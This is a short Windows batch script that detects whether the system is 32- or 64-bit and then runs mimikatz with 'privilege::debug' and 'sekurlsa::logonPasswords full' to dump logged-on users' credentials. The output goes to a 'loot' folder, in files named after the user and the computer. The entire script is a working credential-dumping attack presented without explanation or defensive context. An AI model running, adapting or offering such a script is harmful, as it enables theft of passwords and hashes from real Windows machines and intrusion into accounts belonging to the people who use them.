set OLDDIR=%CD%

echo Windows bit Type IF EXIST "%HOMEDRIVE%\Program Files (x86)" ( echo Windows 7 64-bit

goto 64

) ELSE ( echo Windows 7 32-bit )

goto 32

:64

pause

cd 64

mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" exit > %OLDDIR%\loot\%USERNAME%-%computername%-64BIT.txt

exit

:32

pause

cd 32

mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" exit > %OLDDIR%\loot\%USERNAME%-%computername%-32BIT.txt

cd %OLDDIR%

pause

exit
